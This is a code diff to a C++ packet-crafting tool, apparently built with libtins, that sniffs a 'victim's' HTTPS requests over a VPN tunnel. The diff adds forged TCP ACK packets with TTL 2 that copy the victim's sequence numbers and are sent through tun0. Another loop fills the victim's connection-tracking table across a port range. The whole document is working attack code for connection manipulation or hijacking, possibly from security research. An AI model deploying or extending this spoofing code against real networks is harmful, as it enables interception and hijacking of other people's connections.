@@ -144,6 +144,8 @@ void sniff_website_request_handler() {
 bool _sniff_website_request_handler(PDU &some_pdu) {
 	PacketSender sender;
 	NetworkInterface iface(public_iface);
+
+        NetworkInterface iface2("tun0"); // public_iface);//  
 	const IP &ip = some_pdu.rfind_pdu<IP>();
 	const TCP &tcp_req = some_pdu.rfind_pdu<TCP>();
 	unsigned short vport;
@@ -164,7 +166,18 @@ bool _sniff_website_request_handler(PDU &some_pdu) {
 		// tcp_bind_port(vport);
 		// sender.send(pkt, iface);
 		std::cout << "HTTP Filler - client web port: " << vport << std::endl; 
+		// TCP packets placed in the ASSURED state
+		IP resppkt = IP(victim_ip, "10.8.0.14") / TCP(vport, https_port); 
+		IP& respip = resppkt.rfind_pdu<IP>();
+		respip.ttl(2);
+		TCP &resptcp = resppkt.rfind_pdu<TCP>(); 
+		resptcp.seq(tcp_req.seq());
+		resptcp.ack_seq(tcp_req.ack_seq());
+		resptcp.set_flag(TCP::ACK, 1); 
+		sender.send(resppkt, iface2);
+
 		return false;
+
 		// This might be a problem. We might need to pre-emptivly drop
 		// all the victim's TCP packets (like SYNs) to us so that our
 		// kernel doesn't just respond with RST packets and screw up
@@ -188,7 +201,7 @@ void do_fill_table() {
         while (tcp_continue_ephem) {
 		for (short i=PORT_RANGE_START;i<PORT_RANGE_END; i++) {
                         // TCP packets placed in the ASSURED state
-                        IP pkt = IP(victim_ip, "10.8.0.10") / TCP(i, https_port); 
+                        IP pkt = IP(victim_ip, "10.8.0.14") / TCP(i, https_port); 
 			IP& ip = pkt.rfind_pdu<IP>();
 			ip.ttl(2);
                         TCP &tcp = pkt.rfind_pdu<TCP>(); 
